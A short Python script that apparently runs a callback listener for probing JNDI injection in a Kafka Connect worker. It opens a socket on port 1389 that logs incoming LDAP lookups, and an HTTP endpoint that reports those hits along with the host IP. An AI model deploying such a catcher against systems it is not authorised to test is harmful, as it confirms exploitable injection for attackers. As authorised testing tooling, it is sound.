import http.server, socketserver, os, json, subprocess, urllib.parse, socket, threading, struct
# LDAP listener to catch JNDI lookups from the Connect worker
LOG=[]
def ldap_server(port=1389):
    s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1); s.bind(('0.0.0.0',port)); s.listen(5)
    def h(c):
        try:
            d=c.recv(1024); LOG.append('LDAP-HIT '+repr(d[:120])); c.close()
        except Exception as e: LOG.append('ldap err '+str(e)[:40])
    def loop():
        while True:
            try: c,_=s.accept(); threading.Thread(target=h,args=(c,),daemon=True).start()
            except Exception: break
    threading.Thread(target=loop,daemon=True).start()
    return s
ldap_server(1389); LOG.append('ldap listening :1389')
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        u=urllib.parse.urlparse(self.path)
        body=json.dumps({'log':LOG,'ip':subprocess.run('hostname -i',shell=True,capture_output=True,text=True).stdout.strip()}).encode() if u.path=='/ldaplog' else json.dumps({'ok':1}).encode()
        self.send_response(200); self.send_header("Content-Type","application/json"); self.end_headers(); self.wfile.write(body)
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
with socketserver.TCPServer(("0.0.0.0",3000),H) as s: s.serve_forever()
